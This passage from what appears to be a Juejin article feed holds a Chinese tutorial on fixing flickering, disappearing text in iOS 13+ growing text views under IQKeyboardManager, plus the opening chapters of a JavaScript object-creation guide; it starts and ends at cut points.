<li>ref 一律 <code>nextTick</code></li>
<li>组件要么全受控，要么不受控</li>
<li>减少 setData 次数</li>
</ol>
<hr/>
<h2 data-id="heading-30">十一、一句话总结</h2>
<blockquote>
<p><strong>H5 是“我命令页面怎么变”</strong>
<strong>小程序是“我请求页面帮我变”</strong></p>
</blockquote>
<p>当你真正接受这一点，80% 的坑都会自动消失。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突]]></title>    <link>https://juejin.cn/post/7602176198874546219</link>    <guid>https://juejin.cn/post/7602176198874546219</guid>    <pubDate>2026-02-03T04:26:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602176198874546219" data-draft-id="7602177588442906643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T04:26:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="StarkCoder"/> <meta itemprop="url" content="https://juejin.cn/user/207173399875662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/207173399875662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    StarkCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:26:00.000Z" title="Tue Feb 03 2026 04:26:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在开发 IM 聊天界面或动态表单时，自适应高度输入框（Growing TextView）是标配。但很多开发者发现，原本运行良好的代码，在开启了 <code>IQKeyboardManager</code> 或是升级到 iOS 13+ 后，开始出现“灵异现象”：<strong>换行时文字突然消失、光标乱跳，或者视图在瞬移。</strong></p>
<p>这并不是因为你的代码逻辑写错了，而是由于 iOS 13 之后，底层布局引擎的“脾气”变了。</p>
<hr/>
<h3 data-id="heading-1">一、 核心矛盾：三方势力的坐标争夺战</h3>
<p>在复杂的嵌套场景（如 <code>UIScrollView</code> 套 <code>NIMGrowingTextView</code>）下，输入框其实处于一个非常微妙的竞争环境：</p>
<ol>
<li><strong>NIMGrowingTextView</strong>：它在实时计算高度并修改自身的 <code>frame</code>。</li>
<li><strong>IQKeyboardManager</strong>：它在监控光标位置，通过修改 <code>contentOffset</code> 强行把视图顶起来，防止键盘遮挡。</li>
<li><strong>iOS 13+ 系统引擎</strong>：引入了更严格的布局检测。只要坐标在极短时间内（毫秒级）产生两次非一致性跳变，系统就会尝试“纠偏”，导致渲染闪烁。</li>
</ol>
<p><strong>为什么文字会消失？</strong></p>
<p>当你输入换行，你的代码刚把高度撑开，<code>IQKeyboardManager</code> 为了防止遮挡紧接着做了一次位移，而 iOS 13 此时可能还在后台计算文字排版。多方冲突下，最终计算出的偏移量可能直接把文字推到了可视区域之外。</p>
<hr/>
<h3 data-id="heading-2">二、 iOS 13+ 系统层面的重大调整</h3>
<ol>
<li>
<p><strong>布局死循环检测（Layout Loop Detection）</strong> ：</p>
<p>iOS 13 极其反感在 <code>layoutSubviews</code> 里做不稳定的 frame 修改。即使是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.000001</mn></mrow><annotation encoding="application/x-tex">0.000001</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.000001</span></span></span></span></span> 像素的误差，也会被系统捕捉并触发重复布局，这正是闪烁的根源。</p>
</li>
<li>
<p><strong>TextKit 的异步化趋势</strong>：</p>
<p><code>UITextView</code> 现在的排版不再是完全同步的。当你调用 <code>sizeThatFits:</code> 拿高度时，拿到的可能是个“中间状态”，导致你的布局更新永远比系统的渲染慢半拍。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">三、 具体的业务场景优化方案</h3>
<p>针对这种复杂的业务场景，建议采用“<strong>精确容错+时序调整</strong>”的策略。</p>
<h4 data-id="heading-4">1. 引入高度变化的“避震器”（Threshold）</h4>
<p>不要盲目相信系统的 <code>!=</code> 判断。在 <code>NIMGrowingTextView.m</code> 的 <code>fitToScrollView</code> 方法中，增加阈值过滤：</p>
<p>Objective-C</p>
<pre><code class="hljs language-ini" lang="ini">// 1. 计算出新旧高度差
BOOL <span class="hljs-attr">isHeightChanged</span> = ABS(oldScrollViewFrame.size.height - newScrollViewFrame.size.height) &gt; <span class="hljs-number">0.5</span><span class="hljs-comment">;</span>

// 2. 只有高度变化真正达到 0.5 像素（约 1 个像素点）时才去改 Frame
if (isHeightChanged) {
    <span class="hljs-attr">self.frame</span> = newScrollViewFrame<span class="hljs-comment">;</span>
    <span class="hljs-section">[self invalidateIntrinsicContentSize]</span><span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-5">2. 使用异步校准（Async Scrolling）</h4>
<p>这是解决“文字消失”的关键。我们要利用主线程的任务优先级，让滚动发生在系统和 IQ 库都“折腾完”之后。</p>
<p>Objective-C</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">// 记录用户是否在底部，误差容忍度设为 2.0</span>
<span class="hljs-type">BOOL</span> wasAtBottom = (<span class="hljs-keyword">self</span>.contentOffset.y + <span class="hljs-keyword">self</span>.frame.size.height &gt;= <span class="hljs-keyword">self</span>.contentSize.height - <span class="hljs-number">2.0</span>);

<span class="hljs-keyword">if</span> (wasAtBottom || isHeightChanged) {
    <span class="hljs-comment">// 异步不是为了换线程，是为了跳出当前布局循环</span>
    <span class="hljs-comment">// 在下一帧 RunLoop 强制校准位置，把文字“拉回来”</span>
    <span class="hljs-built_in">dispatch_async</span>(dispatch_get_main_queue(), ^{
        [<span class="hljs-keyword">self</span> scrollToBottom]; 
    });
}
</code></pre>
<h4 data-id="heading-6">3. 复杂嵌套场景：果断切换为“手动挡”</h4>
<p>在 IM 这种深层嵌套、且对交互要求极高的页面，<code>IQKeyboardManager</code> 的自动管理往往会弄巧成拙。</p>
<p><strong>推荐做法</strong>：在该 ViewController 中局部禁用 IQ，改由手动监听键盘通知调整约束。虽然多写了代码，但换来了绝对的掌控力。</p>
<p>Objective-C</p>
<pre><code class="hljs language-ini" lang="ini">- (void)viewWillAppear:(BOOL)animated {
    <span class="hljs-section">[super viewWillAppear:animated]</span><span class="hljs-comment">;</span>
    // 嵌套滚动视图是 IQ 的“禁区”，建议关闭以防止坐标重叠干扰
    <span class="hljs-section">[IQKeyboardManager sharedManager]</span>.<span class="hljs-attr">enable</span> = <span class="hljs-literal">NO</span><span class="hljs-comment">;</span>
}

- (void)viewWillDisappear:(BOOL)animated {
    <span class="hljs-section">[super viewWillDisappear:animated]</span><span class="hljs-comment">;</span>
    <span class="hljs-section">[IQKeyboardManager sharedManager]</span>.<span class="hljs-attr">enable</span> = <span class="hljs-literal">YES</span><span class="hljs-comment">; // 离开页面别忘还原</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-7">四、 总结：开发者要如何应对“不确定性”？</h3>
<ul>
<li><strong>从硬匹配到容错匹配</strong>：iOS 13+ 时代，<code>ABS(diff) &gt; threshold</code> 是比 <code>!=</code> 更安全的布局判断。</li>
<li><strong>理解 RunLoop 的执行顺序</strong>：<code>dispatch_async</code> 是 UI 稳定性的“最后一公里”，它能帮你解决绝大多数的时序冲突。</li>
<li><strong>手动控制的必要性</strong>：业务越复杂，就越要减少对“全家桶”式三方库的依赖，回归底层手动管理。</li>
</ul>
<h3 data-id="heading-8">结语</h3>
<p>Bug 的出现往往意味着旧的开发模式已经不再适配新的系统规则。通过<strong>阈值过滤</strong>和<strong>时序优化</strong>，我们不仅能修复“消失的文字”，更能让 App 在 iOS 13 后的环境中运行得更加优雅。</p>
<hr/>
<p><strong>希望这篇实战分享能帮你解决那些磨人的布局问题！如果觉得有用，欢迎点赞支持。🚀</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 对象创建完全指南：从对象字面量到 Class 继承]]></title>    <link>https://juejin.cn/post/7602259669730623515</link>    <guid>https://juejin.cn/post/7602259669730623515</guid>    <pubDate>2026-02-03T05:21:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730623515" data-draft-id="7602243150157889563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" JavaScript 对象创建完全指南：从对象字面量到 Class 继承"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T05:21:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不会敲代码1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             JavaScript 对象创建完全指南：从对象字面量到 Class 继承
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不会敲代码1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:21:11.000Z" title="Tue Feb 03 2026 05:21:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 对象创建完全指南：从对象字面量到 Class 继承</h2>
<h3 data-id="heading-1">第一章：深入理解JavaScript的面向对象</h3>
<h4 data-id="heading-2">1.1 JavaScript的"独特"面向对象哲学</h4>
<p>JavaScript采用了一种与众不同的面向对象编程（OOP）范式。要真正掌握它，我们需要先理解两个核心概念：</p>
<p><strong>基于原型 vs 基于类</strong>：</p>
<p>想象你要制作一批玩具猫：</p>
<ul>
<li><strong>传统面向对象（Java/C++等）</strong>：
就像用模具制造玩具：
<ol>
<li>先设计模具（类 Class）</li>
<li>用模具批量生产（实例化）</li>
<li>每个玩具都从同一个模具出来，结构相同</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Java示例（对比理解）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {  <span class="hljs-comment">// 模具</span>
    String name;
    String color;
    
    Cat(String name, String color) {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.color = color;
    }
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> {
        System.out.println(name + <span class="hljs-string">"在吃东西"</span>);
    }
}

<span class="hljs-type">Cat</span> <span class="hljs-variable">garfield</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>);  <span class="hljs-comment">// 用模具生产</span>
</code></pre>
<ul>
<li><strong>JavaScript面向对象</strong>：
更像细胞分裂或DNA复制：
<ol>
<li>有一个原型对象（就像DNA）</li>
<li>新对象从这个原型"继承"特性</li>
<li>可以随时修改原型，影响所有"后代"</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript原型示例</span>
<span class="hljs-keyword">const</span> catDNA = {  <span class="hljs-comment">// 原型，像DNA模板</span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫科动物"</span>,
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
};

<span class="hljs-keyword">const</span> garfield = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(catDNA);  <span class="hljs-comment">// 基于DNA创建</span>
garfield.<span class="hljs-property">name</span> = <span class="hljs-string">"加菲猫"</span>;
garfield.<span class="hljs-property">color</span> = <span class="hljs-string">"黄色"</span>;
</code></pre>
<h4 data-id="heading-3">1.2 为什么JavaScript选择这种模式？</h4>
<p>JavaScript在1995年被创造时，设计者Brendan Eich有几个考虑：</p>
<ol>
<li><strong>轻量级</strong>：不需要复杂的类系统</li>
<li><strong>动态性</strong>：运行时可以修改对象结构</li>
<li><strong>简单性</strong>：基于已有的对象创建新对象更直观</li>
</ol>
<p>这种设计使得JavaScript非常灵活，但也让初学者感到困惑。让我们一步步揭开它的神秘面纱。</p>
<h3 data-id="heading-4">第二章：最基础的创建方式——对象字面量</h3>
<h4 data-id="heading-5">2.1 什么是对象字面量？</h4>
<p>对象字面量是JavaScript中最直接的对象创建方式。就像手工制作工艺品，每个都是独立完成的。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建一个猫对象——完全手工制作</span>
<span class="hljs-keyword">const</span> cat1 = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span>,      <span class="hljs-comment">// 属性：名字</span>
    <span class="hljs-attr">color</span>: <span class="hljs-string">"黄色"</span>,       <span class="hljs-comment">// 属性：颜色</span>
    <span class="hljs-attr">type</span>: <span class="hljs-string">"猫"</span>,          <span class="hljs-comment">// 属性：种类</span>
    <span class="hljs-attr">age</span>: <span class="hljs-number">3</span>,              <span class="hljs-comment">// 属性：年龄</span>
    
    <span class="hljs-comment">// 方法：行为</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃意大利面"</span>);
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在沙发上睡觉"</span>);
    },
    
    <span class="hljs-comment">// ES6简写方法</span>
    <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"喵喵~ 我是"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    }
};

<span class="hljs-comment">// 使用对象</span>
cat1.<span class="hljs-title function_">eat</span>();      <span class="hljs-comment">// 输出：加菲猫在吃意大利面</span>
cat1.<span class="hljs-title function_">meow</span>();     <span class="hljs-comment">// 输出：喵喵~ 我是加菲猫</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">age</span>);  <span class="hljs-comment">// 输出：3</span>
</code></pre>
<h4 data-id="heading-6">2.2 对象字面量的工作原理</h4>
<p>当你在JavaScript中写下 <code>{}</code>，引擎会：</p>
<ol>
<li><strong>内存分配</strong>：在内存中分配空间</li>
<li><strong>属性存储</strong>：将属性名和值存储为键值对</li>
<li><strong>方法存储</strong>：函数也是对象，被存储在内存中</li>
<li><strong>引用返回</strong>：返回这个对象的引用（内存地址）</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 深入了解对象结构</span>
<span class="hljs-keyword">const</span> cat = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"咪咪"</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">"白色"</span>
};

<span class="hljs-comment">// 实际在内存中是这样的：</span>
<span class="hljs-comment">// cat → [内存地址] → {</span>
<span class="hljs-comment">//     name: "咪咪" (存储在内存某处)</span>
<span class="hljs-comment">//     color: "白色" (存储在内存另一处)</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-7">2.3 动态添加和修改属性</h4>
<p>对象字面量创建的对象是完全动态的：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cat = { <span class="hljs-attr">name</span>: <span class="hljs-string">"小黄"</span> };

<span class="hljs-comment">// 动态添加属性</span>
cat.<span class="hljs-property">color</span> = <span class="hljs-string">"黄色"</span>;           <span class="hljs-comment">// 添加颜色属性</span>
cat[<span class="hljs-string">"age"</span>] = <span class="hljs-number">2</span>;              <span class="hljs-comment">// 另一种添加方式</span>
cat.<span class="hljs-property">owner</span> = {                <span class="hljs-comment">// 添加对象属性</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">"小明"</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">10</span>
};

<span class="hljs-comment">// 动态添加方法</span>
cat.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
};

<span class="hljs-comment">// 动态修改属性</span>
cat.<span class="hljs-property">name</span> = <span class="hljs-string">"大黄"</span>;           <span class="hljs-comment">// 修改名字</span>
cat.<span class="hljs-property">age</span> += <span class="hljs-number">1</span>;                <span class="hljs-comment">// 年龄增加</span>

<span class="hljs-comment">// 动态删除属性</span>
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">owner</span>;            <span class="hljs-comment">// 删除owner属性</span>

<span class="hljs-comment">// 检查属性是否存在</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> cat);          <span class="hljs-comment">// true</span>
